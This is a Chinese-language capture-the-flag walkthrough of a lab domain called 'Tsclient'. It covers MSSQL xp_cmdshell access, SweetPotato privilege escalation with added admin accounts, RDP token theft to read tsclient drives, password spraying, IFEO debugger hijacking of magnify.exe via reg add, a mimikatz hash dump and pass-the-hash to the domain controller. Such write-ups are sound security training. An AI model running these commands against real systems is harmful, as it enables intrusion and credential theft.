# Tsclient
## Flag01

### 入口



先直接访问靶机看看![image-20260410204920253](https://md-img.serverrlrow.workers.dev/img/20260411222652670.png)

得知是IIS

然后开始用fscan扫一下![image-20260410205947363](https://md-img.serverrlrow.workers.dev/img/20260411222652671.webp)

直接爆出mssql数据库账户密码

用工具MDUT连接

![image-20260410210239989](https://md-img.serverrlrow.workers.dev/img/20260411222652672.webp)

激活组件xpcmdshell就打进去了

### 内网信息收集

![image-20260410210454568](https://md-img.serverrlrow.workers.dev/img/20260411222652674.png)

先收集下信息![image-20260410210723935](https://md-img.serverrlrow.workers.dev/img/20260411222652675.webp)

可以得知这账户没有加入域

![image-20260410210915291](https://md-img.serverrlrow.workers.dev/img/20260411222652676.webp)

发现还有个账户john

### .18本地提权



由于是IIS的环境

可以猜测直接拿sweet poteto提权至管理员

![image-20260410211731165](https://md-img.serverrlrow.workers.dev/img/20260411222652677.png)

创个管理员账户,rdp进去

```
SweetPotato.exe -a "net user bainiao Admin@123 /add"
SweetPotato.exe -a "net localgroup administrators bainiao /add"
```



在管理员目录的flag下找到flag1,同时得到hint

`Maybe you should focus on user sessions...`![image-20260410212227233](https://md-img.serverrlrow.workers.dev/img/20260411222652678.webp)

## Flag02

### 劫持john读取挂载盘



于是命令行`query user`发现john是rdp进来的,

细心的人之前应该发现

![image-20260410212821942](https://md-img.serverrlrow.workers.dev/img/20260411222652679.webp)

我们rdp进来会暴露自己的盘,结合靶场名字`tsclient`我们可以搜索到相关文章

[利用 mstsc 反向攻击思路整理](https://mp.weixin.qq.com/s/Aog7M_6XauRi96wFeRo6sg)

> tsclient 是通过远程桌面连接到远程计算机时，在远程计算机“网上邻居”中出现的一个机器名，实际为远程计算机分配给本机的名称。
>
> 通过`\\tsclient\盘符`可以在远程计算机上访问本机。其访问方式类似于使用 smb 进行文件传输，虽然本质上都是 smb 协议，但是使用 tsclient 无需身份认证，因此可以直接将通过预制手段，使用 tsclient 反向感染。

但我们是自己创的用户怎么办,其实

**管理员权限可以偷RDP用户的token**，从而查看其挂载的盘。

![image-20230808131116769](https://md-img.serverrlrow.workers.dev/img/20260411222652680.webp)

这里直接用sharp token![image-20260410215833574](https://md-img.serverrlrow.workers.dev/img/20260411222652681.png)

如果提示缺失.net3直接安装个

<img src="https://md-img.serverrlrow.workers.dev/img/20260411222652682.webp" alt="image-20260410215554083" style="zoom:50%;" />

查看共享,发现根目录下有个cre..txt比较可疑,一看给我们了一个域账户密码,和hint:镜像劫持



![image-20260410220238726](https://md-img.serverrlrow.workers.dev/img/20260411222652683.png)

### 内网横向



接着传fscan扫描内网

```bash
start vulscan
[*] NetInfo
[*]172.22.8.18
   [->]WIN-WEB
   [->]172.22.8.18
   [->]2001:0:14c9:d206:104b:1bab:d89c:62be
[*] NetInfo
[*]172.22.8.46
   [->]WIN2016
   [->]172.22.8.46
[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT
[*] NetInfo
[*]172.22.8.31
   [->]WIN19-CLIENT
   [->]172.22.8.31
[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01
[*] NetInfo
[*]172.22.8.15
   [->]DC01
   [->]172.22.8.15
[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server
[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server
[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ
```

```
172.22.8.18  本机
172.22.8.46  域内机
172.22.8.31	 域内机
172.22.8.15  域控DC01
```

拿之前文件里的密码做密码喷洒,

由于机器不多,扫整个网段信息比较乱,直接一个一个试了

![image-20260411200541361](https://md-img.serverrlrow.workers.dev/img/20260411222652684.png)

```bash
SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
SMB         172.22.8.15     445    NONE             [-] \Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED
```

三台机子都可以登录,不过密码过期,而且只能在kali用`rdesktop`登录win里连不上

### 拿下.48并提权



挨个试发现只有46机提示更改密码后登录

先收集下信息,是在域内,而且只是普通用户,总之先提权

![image-20260411202038035](https://md-img.serverrlrow.workers.dev/img/20260411222652685.png)

接着用前面hint提到的知识点镜像劫持:[基于辅助功能的镜像劫持攻击原理](https://www.freebuf.com/articles/es/214551.html)

> 为了实现镜像劫持，需要先找到镜像劫持在注册表中的路径，“HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ WindowsNT \ CurrentVersion \ Image File ExecutionOptions”。
>
> 然而WINDOWS NT系统在试图执行一个从命令行调用的可执行文件运行请求时，会先检查运行程序是不是可执行文件，如果是的话，再检查格式，然后就会检查是否存在。由此我们发现，造成镜像劫持的罪魁祸首就是参数“Debugger”，他是IFEO里第一个被处理的参数，若果该参数不为空，系统则会把Debugger参数里指定的程序文件名作为用户试图启动的程序执行请求来处理

```powershell
Get-Acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
```

![image-20260411203204838](https://md-img.serverrlrow.workers.dev/img/20260411222652686.png)

这里我们注意到`HT AUTHORITYAuthenticated Users Allow SetValue, CreateSubKey, ReadKey`,可以随意修改,于是劫持放大镜到system/cmd

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
```



按<kbd>Win</kbd>+ <kbd>L</kbd>锁屏,打开右下角放大镜

![image-20260411203720939](https://md-img.serverrlrow.workers.dev/img/20260411222652687.webp)

老样子继续建个账户方便传东西,然后从我们rdp的Web机上再远控46

![image-20260411204058572](https://md-img.serverrlrow.workers.dev/img/20260411222652688.png)

## Flag03



接下来找flag3,现在剩下域控和172.22.8.31没拿下了,显然在前者

回到之前在kali里远控,查看域控管理员是哪个

![img](https://md-img.serverrlrow.workers.dev/img/20260411222652689.webp)

发现这里的WIN2016$刚好就是本机的机器用户

![image-20260411220053493](https://md-img.serverrlrow.workers.dev/img/20260411222652690.webp)

于是传个mimikatz读机器用户的hash

```

Authentication Id : 0 ; 25100 (00000000:0000620c)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2026/4/11 19:05:24
SID               :
        msv :
         [00000003] Primary
         * Username : WIN2016$
         * Domain   : XIAORANG
         * NTLM     : e7887451d6301ae0a075b48d9af89f12
         * SHA1     : 350622ef25d47ef6334391f5f1c9fb45eab42a0e
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
```



然后PTH去 wmiexec.py连上域控

![image-20260411222510240](https://md-img.serverrlrow.workers.dev/img/20260411222652691.png)